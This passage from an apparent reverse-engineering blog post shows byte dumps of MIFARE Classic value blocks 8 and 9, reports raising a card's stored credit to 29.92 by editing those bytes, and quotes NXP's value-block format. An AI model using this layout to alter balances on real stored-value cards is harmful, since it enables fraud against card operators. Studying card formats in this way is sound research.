      data01: RAW=7B FC FF FF | INT_LE=4294966395 | INT_BE=2080178175 | NOT_LE=       900 | NOT_BE=2214789120 | BIN=11111111111111111111110001111011 | BIN_NOT=00000000000000000000001110000100 | NOT_RAW=84 03 00 00
      data02: RAW=4F F4 FF FF | INT_LE=4294964303 | INT_BE=1341456383 | NOT_LE=      2992 | NOT_BE=2953510912 | BIN=11111111111111111111010001001111 | BIN_NOT=00000000000000000000101110110000 | NOT_RAW=B0 0B 00 00
    !+08
      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
      data02: RAW=B0 0B 00 00 | INT_LE=      2992 | INT_BE=2953510912 | NOT_LE=4294964303 | NOT_BE=1341456383 | BIN=00000000000000000000101110110000 | BIN_NOT=11111111111111111111010001001111 | NOT_RAW=4F F4 FF FF

[BLOCK] abs=09 (0x09) sec=2 blk=1
  data01: [MIFARE VALUE] value=900 adr=9 (0x09)
  data02: [MIFARE VALUE] value=2992 adr=9 (0x09)
  [units=4]
    data01: FULL=[84 03 00 00] | [7B FC FF FF] | [84 03 00 00] | 09 F6 09 F6
    data02: FULL=[B0 0B 00 00] | [4F F4 FF FF] | [B0 0B 00 00] | 09 F6 09 F6
    !+00
      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
      data02: RAW=B0 0B 00 00 | INT_LE=      2992 | INT_BE=2953510912 | NOT_LE=4294964303 | NOT_BE=1341456383 | BIN=00000000000000000000101110110000 | BIN_NOT=11111111111111111111010001001111 | NOT_RAW=4F F4 FF FF
    !+04
      data01: RAW=7B FC FF FF | INT_LE=4294966395 | INT_BE=2080178175 | NOT_LE=       900 | NOT_BE=2214789120 | BIN=11111111111111111111110001111011 | BIN_NOT=00000000000000000000001110000100 | NOT_RAW=84 03 00 00
      data02: RAW=4F F4 FF FF | INT_LE=4294964303 | INT_BE=1341456383 | NOT_LE=      2992 | NOT_BE=2953510912 | BIN=11111111111111111111010001001111 | BIN_NOT=00000000000000000000101110110000 | NOT_RAW=B0 0B 00 00
    !+08
      data01: RAW=84 03 00 00 | INT_LE=       900 | INT_BE=2214789120 | NOT_LE=4294966395 | NOT_BE=2080178175 | BIN=00000000000000000000001110000100 | BIN_NOT=11111111111111111111110001111011 | NOT_RAW=7B FC FF FF
      data02: RAW=B0 0B 00 00 | INT_LE=      2992 | INT_BE=2953510912 | NOT_LE=4294964303 | NOT_BE=1341456383 | BIN=00000000000000000000101110110000 | BIN_NOT=11111111111111111111010001001111 | NOT_RAW=4F F4 FF FF

```

{% include figure.html path="assets/img/blog/2025-10-12/2992.png" class="img-fluid centered" zoomable=true caption="Credit value after editing bytes in blocks 8 and 9: 29.92" %}

## Conclusion

That was enough to confirm the basic layout: the visible balance is stored in blocks `8` and `9`, repeated as a little-endian value and as its inverted counterpart. The other changed block is still suspicious, but it was not needed to make this specific value update work.

The fun part is how little magic there was once the dumps were side by side. Most of the work was not "breaking" anything, but getting the data into a shape where the pattern could be seen.

Of course, most of this reverse engineering could have been avoided by reading section `8.6.2.1` of the NXP specs first. That section describes MIFARE Classic value blocks, which are explicitly meant for electronic purse functions: `read`, `write`, `increment`, `decrement`, `restore`, and `transfer`. In other words, the pattern that looked like a nice recovered structure was already documented in the datasheet.

<details markdown="1">
<summary>Section 8.6.2.1: Value blocks</summary>

In this excerpt I use `~value` and `~adr` for the bitwise-not copies stored in the block. The value itself is signed, so negative values are represented in standard two's-complement form.

Value blocks allow performing electronic purse functions (valid commands are: read,
write, increment, decrement, restore, transfer). Value blocks have a fixed data format
which permits error detection and correction and a backup management.

A value block can only be generated through a write operation in value block format:

- Value: Signifies a signed 4-byte value. The lowest significant byte of a value is stored
in the lowest address byte. Negative values are stored in standard 2's complement
format. For reasons of data integrity and security, a value is stored three times, twice
non-inverted and once inverted.

- Adr: Signifies a 1-byte address, which can be used to save the storage address of a
block, when implementing a powerful backup management. The address byte is stored four
times, twice inverted and non-inverted. During increment, decrement, restore and transfer
operations the address remains unchanged. It can only be altered via a write command.

Figure 8. Value blocks

```plaintext
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Byte Number | 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 |
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Description | value             | ~value            | value             |adr |~adr|adr |~adr|
+-------------+-------------------+-------------------+-------------------+----+----+----+----+
```

An example of a valid value block format for the decimal value `1234567d` and the block
address `17d` is shown in Table 4. First, the decimal value has to be converted to the
hexadecimal representation of `0012D687h`. The LSByte of the hexadecimal value is stored
in Byte 0, the MSByte in Byte 3. The `~value` hexadecimal representation is `FFED2978h`,
where the LSByte is stored in Byte 4 and the MSByte in Byte 7.

The hexadecimal value of the address in the example is `11h`; `~adr` is `EEh`.

Table 4. Value block format example

```plaintext
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Byte Number | 0  | 1  | 2  | 3  | 4  | 5  | 6  | 7  | 8  | 9  | 10 | 11 | 12 | 13 | 14 | 15 |
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Description | value             | ~value            | value             |adr |~adr|adr |~adr|
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
| Values hex  | 87 | D6 | 12 | 00 | 78 | 29 | ED | FF | 87 | D6 | 12 | 00 | 11 | EE | 11 | EE |
+-------------+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+----+
```

</details>
